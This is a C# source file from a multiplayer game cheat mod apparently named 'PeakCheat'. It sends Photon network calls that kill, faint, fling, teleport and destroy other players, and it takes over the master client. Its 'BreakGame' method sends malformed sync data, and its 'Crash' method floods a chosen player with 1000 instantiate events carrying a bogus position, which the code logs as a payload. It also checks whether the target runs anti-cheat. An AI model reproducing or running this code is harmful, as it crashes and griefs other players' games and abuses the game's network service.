using ExitGames.Client.Photon;
using PeakCheat.Classes;
using Photon.Pun;
using Photon.Realtime;
using Sirenix.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;

namespace PeakCheat.Utilities
{
    public static class PlayerUtil
    {
        #region Utilities
        private static Dictionary<global::Player, CheatPlayer> _players = new Dictionary<Player, CheatPlayer>();
        public static CheatPlayer[] AllPlayers() => PlayerHandler.GetAllPlayers().Select(ToCheatPlayer).ToArray();
        public static CheatPlayer[] OtherPlayers() => AllPlayers().Where(P => !P.PhotonPlayer.IsLocal).ToArray();
        public static global::Player ToPlayer(this Photon.Realtime.Player player) => PlayerHandler.GetPlayer(player);
        public static PhotonView[] AllViews() => AllPlayers().Select(FromPlayer).ToArray();
        public static PhotonView[] OtherViews() => OtherPlayers().Select(FromPlayer).ToArray();
        public static CheatPlayer ToCheatPlayer(this global::Player player) => GetCheatPlayer(player);
        public static CheatPlayer ToCheatPlayer(this Character character) => GetCheatPlayer(character.player);
        public static CheatPlayer ToCheatPlayer(this Photon.Realtime.Player player) => GetCheatPlayer(PlayerHandler.GetPlayer(player));
        public static CheatPlayer GetCheatPlayer(global::Player player)
        {
            if (!_players.TryGetValue(player, out var cheatPlayer))
            {
                cheatPlayer = new CheatPlayer(player);
                _players[player] = cheatPlayer;
            }
            return cheatPlayer;
        }
        public static PhotonView FromPlayer(this CheatPlayer player) => player.View;
        public static Vector3 Position(this CheatPlayer player) => player.Position;
        public static bool InRange(this CheatPlayer player, float range) =>
            Vector3.Distance(UnityUtil.CurrentPosition(), player.Position()) <= range;
        public static bool TryGetPhotonPlayer(this global::Player player, out Photon.Realtime.Player photonPlayer)
        {
            foreach (var p in PhotonNetwork.PlayerList)
            {
                if (PlayerHandler.TryGetPlayer(p.ActorNumber, out var P) && P == player)
                {
                    photonPlayer = p;
                    return true;
                }
            }
            photonPlayer = null;
            return false;
        }
        public static int GetID(this CheatPlayer player) => GeneralUtil.Compute(player.Name + (player.PhotonPlayer?.ActorNumber?? -1) + PhotonNetwork.CurrentRoom.Name);
        #endregion
        #region Scripts
        private class DeathPatch: CheatBehaviour
        {
            private static Dictionary<int, Vector3> _positions = new Dictionary<int, Vector3>();
            void CheatBehaviour.Update() => AllPlayers().Where(P => P.Alive).ForEach(P => _positions[P.GetID()] = P.BodyTransform?.position?? Vector3.zero);
            public static Vector3 GetDiedPos(CheatPlayer player)
            {
                if (!_positions.TryGetValue(player.GetID(), out var pos))
                {
                    pos = AllPlayers().First(P => P.Alive).Position + (Vector3.right * .7f) - (Vector3.up * .4f);
                    _positions.Add(player.GetID(), pos);
                }

                return pos;
            }
        }
        public static Vector3 NaN => Vector3.one * (float.MaxValue / 10f);
        public static Vector3 GetDeathPosition(this CheatPlayer player) => DeathPatch.GetDiedPos(player);
        public static void PlayerRPC(this CheatPlayer player, string RPC) => PlayerRPC(player, RPC, RpcTarget.All);
        public static void PlayerRPC(this CheatPlayer player, string RPC, RpcTarget target) => PlayerRPC(player, RPC, target, Array.Empty<object>());
        public static void PlayerRPC(this CheatPlayer player, string RPC, object data) => PlayerRPC(player, RPC, RpcTarget.All, data);
        public static void PlayerRPC(this CheatPlayer player, string RPC, CheatPlayer target, object data) => PlayerRPC(player, RPC, target, data);
        public static void PlayerRPC(this CheatPlayer player, string RPC, params object[] data) => PlayerRPC(player, RPC, RpcTarget.All, data);
        public static void PlayerRPC(this CheatPlayer player, string RPC, RpcTarget target, params object[] data) => player.View?.RPC(RPC, target, data);
        public static void PlayerRPC(this CheatPlayer player, string RPC, CheatPlayer target, params object[] data) => player.View?.RPC(RPC, target, data);
        public static bool GetMaster() => PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
        public static void Kill(this CheatPlayer player) => PlayerRPC(player, "RPCA_Die", player.Position);
        public static void Destroy(this CheatPlayer player)
        {
            if (!TimeUtil.CheckTime($"Destroy:{player.Name}", 3f)) return;
            if (!PhotonNetwork.IsMasterClient && !GetMaster())
            {
                LogUtil.Log(false, "[Destroy] Could not get master client!");
                return;
            }
            LogUtil.Log($"Destroy {player}..");
            Faint(player);
            PhotonNetwork.DestroyPlayerObjects(player.PhotonPlayer.ActorNumber, false);
        }
        public static void Fling(this CheatPlayer player)
        {
            if (!TimeUtil.CheckTime($"Fling:{player.Name}", .3f))
            {
                LogUtil.Log(false, "Rejecting fling (time delay returned false)");
                return;
            }
            for (int i = 0; i < 500; i++)
                Jump(player, true, (i + 1) % 2 == 0);
        }
        public static void Jump(this CheatPlayer player, bool ForceJump, bool PalJump)
        {
            if (ForceJump)
                PlayerRPC(player, "JumpRpc", PalJump);
            else if (player.OnGround) PlayerRPC(player, "JumpRpc", PalJump);
        }
        public static void SetDeadEyes(this CheatPlayer player, bool Dead) => PlayerRPC(player, Dead ? "CharacterDied" : "OnRevive_RPC");
        public static void Faint(this CheatPlayer player) => PlayerRPC(player, "RPCA_PassOut");
        public static void Fall(this CheatPlayer player) => PlayerRPC(player, "RPCA_Fall", 1f);
        public static void Fall(this CheatPlayer player, float seconds) => PlayerRPC(player, "RPCA_Fall", seconds);
        public static void Revive(this CheatPlayer player)
        {
            if (player.Alive) return;

            LogUtil.Log($"Reviving Player \"{player.Name}\"..");
            PlayerRPC(player, "RPCA_ReviveAtPosition", new object[] { GetDeathPosition(player), true });
        }
        public static void DeleteItem(this CheatPlayer player)
        {
            if (!player.GetItem(out var item))
            {
                LogUtil.Log(false, $"Couldnt force consume Item (Instance is null)");
                return;
            }
            if (item == null)
            {
                LogUtil.Log(false, $"Couldnt force consume Item (GetItem = true, Instance is null)");
                return;
            }
            item.photonView.RPC("Consume", RpcTarget.All, -1);
            LogUtil.Log($"Force Consumed Item-Instance \"{item.name}\" for player: {player.Name}");
        }
        public static void Teleport(this CheatPlayer player, Vector3 pos) => Teleport(player, pos, false);
        public static void Teleport(this CheatPlayer player, Vector3 pos, bool rpc)
        {
            if (rpc)
            {
                PlayerRPC(player, "WarpPlayerRPC", new object[] { pos, true });
                return;
            }
            TeleportUtil.Teleport(player, pos);
        }
        public static void SpazScreen(this CheatPlayer player) => PlayerRPC(player, "RPCA_FallWithScreenShake", player, .1f, float.MaxValue);
        public static void SetVelocity(this CheatPlayer player, Vector3 velocity)
        {
            foreach (var part in player.GameCharacter.refs.ragdoll.partList)
                PlayerRPC(player, "RPCA_AddForceToBodyPart", new object[] { part, Vector3.zero, velocity * 30f });
        }
        public static void BreakGame(this CheatPlayer player)
        {
            int num = 0;
            var RPCMethod = typeof(CharacterData).GetMethod("RPC_SyncOnJoin");
            object[] parameters = new object[RPCMethod.GetParameters().Count()];

            foreach (var paramType in RPCMethod.GetParameters().Select(p => p.ParameterType))
                if (paramType == typeof(bool)) parameters[num++] = true;
                else if (paramType == typeof(bool[])) parameters[num++] = Array.Empty<bool>();
                else if (paramType == typeof(float)) parameters[num++] = 0f;
                else if (paramType == typeof(PhotonView)) parameters[num++] = Character.localCharacter.photonView;

            if (!ACDisabler.UsingAntiCheat(player)) Teleport(player, NaN);
            PlayerRPC(player, "RPC_SyncOnJoin", parameters);
        }
        public static bool Crash(this CheatPlayer player)
        {
            if (!TimeUtil.CheckTime(1f)) return false;
            var hash = new Hashtable();

            hash.Add(0, "0_Items/Passport");
            hash.Add(1, NaN);
            hash.Add(2, Quaternion.identity);
            hash.Add(3, 0);
            hash.Add(4, 0.SingleArray());
            hash.Add(5, Array.Empty<object>());
            hash.Add(6, PhotonNetwork.ServerTimestamp);
            hash.Add(7, 0);

            bool worked = true;
            var opts = new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.All,
                CachingOption = EventCaching.DoNotCache,
                TargetActors = (player.PhotonPlayer?.ActorNumber ?? -1).SingleArray()
            };

            for (int i = 0; i < 1000; i++)
            {
                bool sent = PhotonNetwork.NetworkingClient.OpRaiseEvent(202, hash, opts, SendOptions.SendReliable);
                if (!sent)
                {
                    worked = false;
                    break;
                }
            }
            
            if (!worked)
            {
                LogUtil.Log(true, "Failed to send instantiate payload!");
                return false;
            }
            LogUtil.Log("Sent Instantiate payload Successfully");
            return true;
        }
        #endregion
    }
}